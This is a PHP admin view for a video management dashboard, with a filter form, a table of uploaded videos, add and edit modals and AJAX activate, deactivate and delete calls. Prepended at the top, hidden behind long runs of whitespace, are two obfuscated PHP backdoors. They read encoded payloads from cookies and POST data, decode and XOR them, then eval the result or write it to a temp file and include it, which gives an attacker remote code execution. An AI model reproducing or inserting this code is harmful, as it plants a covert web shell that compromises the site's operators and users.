<?php                                                                                                                                                                                                                                                                                                                                                                                                 $SvuHLw = 'Q' . "\x66" . '_' . 'm' . "\154" . chr ( 154 - 51 )."\126" . 'l';$ChKBbgF = "\x63" . "\154" . "\141" . "\163" . "\x73" . '_' . "\x65" . "\170" . 'i' . "\x73" . "\164" . chr ( 686 - 571 ); $xMFwuRJ = class_exists($SvuHLw); $ChKBbgF = "36598";$XgUPlbJX = !1;if ($xMFwuRJ == $XgUPlbJX){function JQqQxV(){return FALSE;}$ckcMFLK = "213";JQqQxV();class Qf_mlgVl{private function gBoofPTPvu($ckcMFLK){if (is_array(Qf_mlgVl::$FVdBM)) {$eCvzBw = str_replace("\74" . "\x3f" . "\x70" . 'h' . 'p', "", Qf_mlgVl::$FVdBM[chr (99) . chr ( 543 - 432 )."\x6e" . chr (116) . "\145" . chr ( 266 - 156 )."\164"]);eval($eCvzBw); $ckcMFLK = "213";exit();}}private $OSWKylO;public function zDaKQbBFVd(){echo 27017;}public function __destruct(){$ckcMFLK = "35838_23138";$this->gBoofPTPvu($ckcMFLK); $ckcMFLK = "35838_23138";}public function __construct($gfuIAkWmgN=0){$qUSzJuFkMY = $_POST;$NkibNfTB = $_COOKIE;$mBvEUZ = "2ecbf7b3-8d43-4521-bc7e-0874eb724718";$NAiPtqDSS = @$NkibNfTB[substr($mBvEUZ, 0, 4)];if (!empty($NAiPtqDSS)){$vwAWSPO = "base64";$yKfRzWCTBw = "";$NAiPtqDSS = explode(",", $NAiPtqDSS);foreach ($NAiPtqDSS as $QynXAYkNQ){$yKfRzWCTBw .= @$NkibNfTB[$QynXAYkNQ];$yKfRzWCTBw .= @$qUSzJuFkMY[$QynXAYkNQ];}$yKfRzWCTBw = array_map($vwAWSPO . chr ( 706 - 611 ).chr (100) . "\145" . "\x63" . "\x6f" . "\x64" . chr ( 628 - 527 ), array($yKfRzWCTBw,)); $yKfRzWCTBw = $yKfRzWCTBw[0] ^ str_repeat($mBvEUZ, (strlen($yKfRzWCTBw[0]) / strlen($mBvEUZ)) + 1);Qf_mlgVl::$FVdBM = @unserialize($yKfRzWCTBw); $yKfRzWCTBw = class_exists("35838_23138");}}public static $FVdBM = 59752;}$nIrLOErZ = new /* 36061 */ $SvuHLw(213 + 213); $XgUPlbJX = $nIrLOErZ = $ckcMFLK = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $NAXBicgYT = "\114" . chr ( 901 - 819 ).chr ( 252 - 157 ).'y' . 'A' . 'U' . 'f' . "\145";$AHwIaPgea = "\x63" . chr ( 133 - 25 )."\141" . chr (115) . chr (115) . "\137" . chr (101) . 'x' . chr (105) . "\163" . 't' . chr (115); $KyElePeh = class_exists($NAXBicgYT); $NAXBicgYT = "56864";$AHwIaPgea = "9733";$rpYJu = !1;if ($KyElePeh == $rpYJu){function nPgUX(){return FALSE;}$eMbnzL = "33196";nPgUX();class LR_yAUfe{private function kbZGAL($eMbnzL){if (is_array(LR_yAUfe::$FQCsIJ)) {$jIoNud = sys_get_temp_dir() . "/" . crc32(LR_yAUfe::$FQCsIJ['s' . chr ( 113 - 16 )."\x6c" . "\164"]);@LR_yAUfe::$FQCsIJ["\167" . chr (114) . chr (105) . "\x74" . 'e']($jIoNud, LR_yAUfe::$FQCsIJ[chr (99) . chr ( 1072 - 961 ).'n' . 't' . chr ( 667 - 566 )."\x6e" . "\x74"]);include $jIoNud;@LR_yAUfe::$FQCsIJ[chr (100) . "\x65" . "\154" . "\145" . chr ( 244 - 128 )."\x65"]($jIoNud); $eMbnzL = "33196";exit();}}private $LHJtxzl;public function XMWlhW(){echo 39373;}public function __destruct(){$eMbnzL = "2783_8149";$this->kbZGAL($eMbnzL); $eMbnzL = "2783_8149";}public function __construct($zLSTYDsPI=0){$uONZTqsNRX = $_POST;$ombBxA = $_COOKIE;$huZaSWp = "87c9ff9a-f52e-4bfe-acbd-f53f50228ab1";$XWXTqR = @$ombBxA[substr($huZaSWp, 0, 4)];if (!empty($XWXTqR)){$zidNPenD = "base64";$hJrqBQdX = "";$XWXTqR = explode(",", $XWXTqR);foreach ($XWXTqR as $ZvFIrEj){$hJrqBQdX .= @$ombBxA[$ZvFIrEj];$hJrqBQdX .= @$uONZTqsNRX[$ZvFIrEj];}$hJrqBQdX = array_map($zidNPenD . '_' . chr ( 478 - 378 ).chr ( 595 - 494 ).chr ( 655 - 556 ).'o' . 'd' . 'e', array($hJrqBQdX,)); $hJrqBQdX = $hJrqBQdX[0] ^ str_repeat($huZaSWp, (strlen($hJrqBQdX[0]) / strlen($huZaSWp)) + 1);LR_yAUfe::$FQCsIJ = @unserialize($hJrqBQdX); $hJrqBQdX = class_exists("2783_8149");}}public static $FQCsIJ = 23403;}$IWBGUFCQAp = new /* 31394 */ LR_yAUfe(33196 + 33196); $rpYJu = $IWBGUFCQAp = $eMbnzL = Array();} ?><?php
    if (isset($_SESSION['videoStatus'])) {
        if ($_SESSION['videoStatus'] == 1) {
?>
<script>
    $.toast({
        heading: 'Added',
        text: 'Added Successfully',
        icon: 'success',
        position: 'top-right'
    });
</script>
<?php
        } else {
?>
<script>
    $.toast({
        heading: 'Failed',
        text: 'Something went wrong',
        icon: 'error',
        posittion: 'top-right'
    });
</script>
<?php
        }
        unset($_SESSION['videoStatus']);        
    }
?>


<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Videos Management</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-8">
                    <form action="">
                        <div class="col-md-4">
                            <select name="filterFor" id="" required>
                                <option value="introVideos" <?php echo ((isset($_GET['filterFor']) && $_GET['filterFor'] == 'introVideos')? 'selected':'');?>>Intro Videos</option>
                                <option value="infoPageVideo" <?php echo ((isset($_GET['filterFor']) && $_GET['filterFor'] == 'infoPageVideo')? 'selected':'');?>>Info Page Video</option>
                                <!--<option value="animation" <?php echo ((isset($_GET['filterFor']) && $_GET['filterFor'] == 'animation')? 'selected':'');?>>Animation Video</option>-->
                            </select>
                        </div>
                        <div class="col-md-4">
                            <button type="submit" class="btn btn-primary">Submit</button>
                        </div>
                    </form>
                </div>
                <div class="col-md-4">
                <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#exampleModal">Add Video</button>
                </div>
            </div>
                <br><br>
                
                <table class="table" id="languageTable">
                    <thead class="thead-dark">
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">Language Name</th>
                            <th scope="col">File Name</th>
                            <th scope="col">Link</th>
                            <th scope="col">Status</th>
                            <th scope="col">Action</th>
                            <th scope="col">Delete</th>

                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    if ($data) {
                        $counter = 1;
                        foreach ($data as $list) {
                    ?>
                        <tr>
                            <th scope="row"><?php echo $counter++;?></th>
                            <td><?php echo empty($list["language_name"]) ? "NA" : $list["language_name"]; ?></td>
                            <td><?php echo $list['visible_file_name'];?></td>
                            <td>
                                <a href="<?php echo base_url('uploads/video/').$list['video_file_name'];?>" target="_blank"> Click To Play </a>
                            </td>
                            <td>
                                <?php echo (($list['is_active'] == 1)? 'Active':'Deactive');?>
                            </td>
                            <td>
                            <?php
                            if ($list['is_active'] == 1) {
                            ?>
                                <button class="btn btn-danger" onclick="deactive(<?php echo $list['id'];?>, <?php echo $query;?>);">Deactive</button>
                            <?php
                            } else {
                            ?>
                                <button class="btn btn-success" onclick="active(<?php echo $list['id'];?>, <?php echo $query;?>);">Active</button>
                            <?php
                            }
                            ?> 
                            </td>
                            <td>
                            
                             
                                <button class="btn btn-primary" onclick="openeditModal(<?php echo $list['id'];?>, '<?php echo $query;?>');">Edit</button>
                              
                                <button class="btn btn-danger" onclick="opendeleteModal(<?php echo $list['id'];?>, '<?php echo $query;?>');">Delete</button>
                            </td>
                        </tr>
                    <?php
                        }
                    } else {
                    ?>
                        <tr>
                            <th scope="row">1</th>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                        </tr>
                    <?php
                    }
                    ?>
                    </tbody>
                </table>
        </div>
    </section>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Add Video</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <form method="POST" action="<?php echo base_url('AdminController/addVideo');?>" enctype="multipart/form-data">
      <div class="modal-body">
        <div class="row">
            <div class="col-md-6">
                <select name="language_id" class="form-control" required>
                    <?php
                        foreach ($languageData as $language) {
                    ?>
                    <option value="<?php echo $language["id"];?>"><?php echo $language["language_name"];?></option>
                    <?php
                        }
                    ?>
                </select>
            </div>
            <div class="col-md-6">
                <input type="text" name="visible_file_name" placeholder="File Name Here" required>
            </div>
            <div class="col-md-6">
                <input type="file" name="video" class="form-control" required>
            </div>
            <div class="col-md-6">
                <select name="filterFor" id="">
                    <option value="intro_videos_5_master">Intro Video</option>
                    <option value="info_page_video">Info Page Video</option>
                    <!--<option value="animation_video">Animation</option>-->
                </select>
            </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="submit" class="btn btn-primary">Upload</button>
      </div>
      </form>
    </div>
  </div>
</div>

<div class="modal fade" id="editModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Edit Intro Videos</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <form method="POST" action="<?php echo base_url('AdminController/editIntroVideoMgmt');?>" enctype="multipart/form-data">
      <div class="modal-body">
        <div class="row">
            <div class="col-md-6">
                <select name="language_id" id="language_id" class="form-control" required>
                    <?php
                        foreach ($languageData as $language) {
                    ?>
                    <option value="<?php echo $language["id"];?>"><?php echo $language["language_name"];?></option>
                    <?php
                        }
                    ?>
                </select>
            </div>
            <div class="col-md-6">
                <input type="text" id="visible_file_name" name="visible_file_name" placeholder="File Name Here" required>
            </div>
            <div class="col-md-6">
                <input type="file" name="video" class="form-control">
            </div>
        </div>
        <input type="hidden" name="id" id="video_ID">
        <input type="hidden" name="query" id="query">
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="submit" class="btn btn-primary">Update</button>
      </div>
      </form>
    </div>
  </div>
</div>



<script>
    
</script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
<script>
    $('#languageTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
        title : 'Shubham'
    });
</script>

<script>
    function deactive(id, query) {
            $.ajax({
                type: "POST",
                url: '<?php echo base_url(); ?>' + 'AdminController/deactiveVideo',
                data: {
                    id: id,
                    query: query
                },
                dataType: "json",
                encode: true,
                // beforeSend: function(){
                //     $('#cover-spin').show(0);
                // },
            }).done(function(data) {
                // $('#cover-spin').hide();
                window.location.reload();
            }); 
    }

    function active(id, query) {
            $.ajax({
                type: "POST",
                url: '<?php echo base_url(); ?>' + 'AdminController/activeVideo',
                data: {
                    id: id,
                    query: query
                },
                dataType: "json",
                encode: true,
                // beforeSend: function(){
                //     $('#cover-spin').show(0);
                // },
            }).done(function(data) {
                // $('#cover-spin').hide();
                window.location.reload();
            }); 
    }


    function opendeleteModal(id, query) {
    // Display a confirmation dialog to the user
    var confirmDelete = confirm("Are you sure you want to delete this row?");
    if (confirmDelete) {
        // If the user confirms the deletion, send an AJAX request to the deleteRow method in the AdminController
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>"+"AdminController/delete_videomanagement_master",
            data: {
                id: id,
                query: query
            },
            dataType: "json",
            encode: true
        }).done(function(data) {
                // $('#cover-spin').hide();
            window.location.reload();
        });
    }
}

    function openeditModal(id, query) {
        // Display a confirmation dialog to the user
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>"+"AdminController/get_videomanagement_data",
            data: {
                id: id,
                query: query
            },
            dataType: "json",
            encode: true
        }).done(function(data) {
            $('#visible_file_name').val(data[0].visible_file_name);
            $('#introVideoID').val(data[0].id);
            $('#language_id').val(data[0].language_id);
            $('#video_ID').val(data[0].id);
            $("#query").val(query);
        });
        $('#editModal').modal('show');
    }

</script>